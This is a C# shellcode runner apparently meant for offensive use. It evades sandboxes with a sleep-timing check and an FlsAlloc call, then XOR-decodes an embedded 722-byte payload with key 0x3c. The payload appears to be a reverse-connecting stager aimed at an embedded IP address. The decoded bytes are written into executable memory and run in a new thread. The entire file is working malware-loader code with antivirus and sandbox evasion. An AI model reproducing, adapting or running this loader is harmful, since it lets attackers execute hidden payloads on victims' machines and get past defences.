using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace CSharpShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
            uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
        dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);
        static void Main(string[] args)
        {
            DateTime stime = DateTime.Now;
            Sleep(4000);
            double etime = DateTime.Now.Subtract(stime).TotalSeconds;
            if (etime < 3.5)
            {
                return;
            }

            IntPtr call = FlsAlloc(IntPtr.Zero);
            if (call == null)
            {
                return;
            }


            byte[] buf = new byte[722] {
0xc0,0x74,0xbf,0xd8,0xcc,0xd4,0xf0,0x3c,0x3c,0x3c,0x7d,0x6d,0x7d,0x6c,0x6e,0x6d,0x74,0x0d,0xee,
0x59,0x74,0xb7,0x6e,0x5c,0x74,0xb7,0x6e,0x24,0x74,0xb7,0x6e,0x1c,0x6a,0x74,0x33,0x8b,0x76,0x76,
0x74,0xb7,0x4e,0x6c,0x71,0x0d,0xf5,0x74,0x0d,0xfc,0x90,0x00,0x5d,0x40,0x3e,0x10,0x1c,0x7d,0xfd,
0xf5,0x31,0x7d,0x3d,0xfd,0xde,0xd1,0x6e,0x74,0xb7,0x6e,0x1c,0xb7,0x7e,0x00,0x74,0x3d,0xec,0x5a,0xbd,0x44,0x24,
0x37,0x3e,0x7d,0x6d,0x33,0xb9,0x4e,0x3c,0x3c,0x3c,0xb7,0xbc,0xb4,0x3c,0x3c,0x3c,0x74,0xb9,0xfc,
0x48,0x5b,0x74,0x3d,0xec,0xb7,0x74,0x24,0x6c,0x78,0xb7,0x7c,0x1c,0x75,0x3d,0xec,0xdf,0x6a,0x74,
0xc3,0xf5,0x71,0x0d,0xf5,0x7d,0xb7,0x08,0xb4,0x74,0x3d,0xea,0x74,0x0d,0xfc,0x7d,0xfd,0xf5,0x31,
0x90,0x7d,0x3d,0xfd,0x04,0xdc,0x49,0xcd,0x70,0x3f,0x70,0x18,0x34,0x79,0x05,0xed,0x49,0xe4,0x64,
0x78,0xb7,0x7c,0x18,0x75,0x3d,0xec,0x5a,0x7d,0xb7,0x30,0x74,0x78,0xb7,0x7c,0x20,0x75,0x3d,0xec,
0x7d,0xb7,0x38,0xb4,0x7d,0x64,0x7d,0x64,0x74,0x3d,0xec,0x62,0x65,0x66,0x7d,0x64,0x7d,0x65,0x7d,
0x66,0x74,0xbf,0xd0,0x1c,0x7d,0x6e,0xc3,0xdc,0x64,0x7d,0x65,0x66,0x74,0xb7,0x2e,0xd5,0x77,0xc3,
0xc3,0xc3,0x61,0x74,0x0d,0xe7,0x6f,0x75,0x82,0x4b,0x55,0x52,0x55,0x52,0x59,0x48,0x3c,0x7d,0x6a,
0x74,0xb5,0xdd,0x75,0xfb,0xfe,0x70,0x4b,0x1a,0x3b,0xc3,0xe9,0x6f,0x6f,0x74,0xb5,0xdd,0x6f,0x66,
0x71,0x0d,0xfc,0x71,0x0d,0xf5,0x6f,0x6f,0x75,0x86,0x06,0x6a,0x45,0x9b,0x3c,0x3c,0x3c,0x3c,0xc3,
0xe9,0xd4,0x32,0x3c,0x3c,0x3c,0x0d,0x05,0x0e,0x12,0x0d,0x0a,0x04,0x12,0x08,0x05,0x12,0x09,0x09,
0x3c,0x66,0x74,0xb5,0xfd,0x75,0xfb,0xfc,0x87,0x3d,0x3c,0x3c,0x71,0x0d,0xf5,0x6f,0x6f,0x56,0x3f,
0x6f,0x75,0x86,0x6b,0xb5,0xa3,0xfa,0x3c,0x3c,0x3c,0x3c,0xc3,0xe9,0xd4,0x95,0x3c,0x3c,0x3c,0x13,
0x59,0x4d,0x7a,0x7d,0x5a,0x0f,0x76,0x53,0x59,0x7d,0x63,0x65,0x6d,0x48,0x50,0x7d,0x49,0x50,0x49,
0x72,0x58,0x4b,0x78,0x71,0x7e,0x4a,0x0a,0x78,0x5d,0x6b,0x71,0x7b,0x48,0x6f,0x4f,0x6e,0x7a,0x53,
0x4a,0x79,0x55,0x73,0x48,0x74,0x74,0x7b,0x66,0x72,0x09,0x7a,0x11,0x69,0x0a,0x05,0x5f,0x78,0x7f,
0x5e,0x46,0x74,0x5f,0x7a,0x52,0x5f,0x78,0x59,0x0d,0x55,0x0f,0x0b,0x51,0x0c,0x70,0x76,0x05,0x08,
0x6d,0x6a,0x46,0x0e,0x49,0x75,0x70,0x52,0x45,0x71,0x75,0x55,0x4f,0x48,0x5a,0x55,0x48,0x52,0x0f,
0x5d,0x51,0x6a,0x7a,0x11,0x5a,0x65,0x0c,0x6f,0x72,0x50,0x48,0x77,0x6f,0x66,0x66,0x4e,0x69,0x57,
0x66,0x4f,0x7b,0x77,0x7e,0x6c,0x5e,0x5a,0x49,0x75,0x7f,0x0e,0x57,0x72,0x5b,0x0e,0x5f,0x78,0x5d,
0x0e,0x6c,0x6a,0x7f,0x68,0x49,0x5a,0x63,0x4a,0x7b,0x7e,0x0e,0x6f,0x5a,0x4b,0x73,0x4b,0x78,0x56,
0x68,0x5a,0x49,0x05,0x66,0x5d,0x6d,0x4d,0x04,0x79,0x0f,0x5f,0x5f,0x5a,0x75,0x3c,0x74,0xb5,0xfd,
0x6f,0x66,0x7d,0x64,0x71,0x0d,0xf5,0x6f,0x74,0x84,0x3c,0x0e,0x94,0xb8,0x3c,0x3c,0x3c,0x3c,0x6c,
0x6f,0x6f,0x75,0xfb,0xfe,0xd7,0x69,0x12,0x07,0xc3,0xe9,0x74,0xb5,0xfa,0x56,0x36,0x63,0x74,0xb5,
0xcd,0x56,0x23,0x66,0x6e,0x54,0xbc,0x0f,0x3c,0x3c,0x75,0xb5,0xdc,0x56,0x38,0x7d,0x65,0x75,0x86,
0x49,0x7a,0xa2,0xba,0x3c,0x3c,0x3c,0x3c,0xc3,0xe9,0x71,0x0d,0xfc,0x6f,0x66,0x74,0xb5,0xcd,0x71,
0x0d,0xf5,0x71,0x0d,0xf5,0x6f,0x6f,0x75,0xfb,0xfe,0x11,0x3a,0x24,0x47,0xc3,0xe9,0xb9,0xfc,0x49,
0x23,0x74,0xfb,0xfd,0xb4,0x2f,0x3c,0x3c,0x75,0x86,0x78,0xcc,0x09,0xdc,0x3c,0x3c,0x3c,0x3c,0xc3,
0xe9,0x74,0xc3,0xf3,0x48,0x3e,0xd7,0x96,0xd4,0x69,0x3c,0x3c,0x3c,0x6f,0x65,0x56,0x7c,0x66,0x75,
0xb5,0xed,0xfd,0xde,0x2c,0x75,0xfb,0xfc,0x3c,0x2c,0x3c,0x3c,0x75,0x86,0x64,0x98,0x6f,0xd9,0x3c,
0x3c,0x3c,0x3c,0xc3,0xe9,0x74,0xaf,0x6f,0x6f,0x74,0xb5,0xdb,0x74,0xb5,0xcd,0x74,0xb5,0xe6,0x75,
0xfb,0xfc,0x3c,0x1c,0x3c,0x3c,0x75,0xb5,0xc5,0x75,0x86,0x2e,0xaa,0xb5,0xde,0x3c,0x3c,0x3c,0x3c,
0xc3,0xe9,0x74,0xbf,0xf8,0x1c,0xb9,0xfc,0x48,0x8e,0x5a,0xb7,0x3b,0x74,0x3d,0xff,0xb9,0xfc,0x49,
0xee,0x64,0xff,0x64,0x56,0x3c,0x65,0x75,0xfb,0xfe,0xcc,0x89,0x9e,0x6a,0xc3,0xe9 };

            // uncomment the appropriate decryption mechanism based on shellcode encryption

            // caesar decrypt
            /*
            for(int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }
            */

            // xor decrypt with key value 0x3c

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0x3c); 
            }
            

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}